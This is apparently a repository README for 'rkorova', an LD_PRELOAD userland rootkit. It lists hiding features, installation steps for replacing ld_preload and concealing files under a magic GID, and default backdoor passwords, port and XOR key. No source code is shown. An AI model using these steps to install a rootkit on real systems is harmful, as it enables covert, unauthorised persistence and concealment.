# rkorova

bad userland LD_PRELOAD rootkit 

## Features 
* important strings are xor'ed out 
* hiding through magic GID / env var 
* memory cleaning 
* totally awful

```
## Installation
* step 1: change default values 
* step 2: run compile.sh to compile 
* step 3: create magic user 
* step 4: replace ld_preload with librkorova.so
* step 5: set your magic env var in ~/.bash_profile or whatever 
* step 6: hide any other files not owned by you with chgrp (magic gid) (file) 

rkorova will (ideally) hide any files that are under the magic GID and/or the hidden user. in fact, you don't even need a user as long as you hide all files under the GID

## Known Issues 
rkorova is not actually meant to be deployed in a real engagement and is pretty awful at hiding in that regard. I am not responsible for any illegal / stupid things that happen because you decided to act el8 in front of your friends on IRC 
* If a file is hidden, it will appear in bash autocomplete but cannot be interacted with.
* rkorova sometimes completely breaks when git is involved 

## Default values: 
* MAGIC = "mochi"
* MAGICGID = 1337 
* EXECPW = installgentoo
* SHELLPW = bl1ng
* PROC = /proc
* DEFAULT_PORT = 61040
* IP = 127.0.0.1
* XOR key = 0x2A
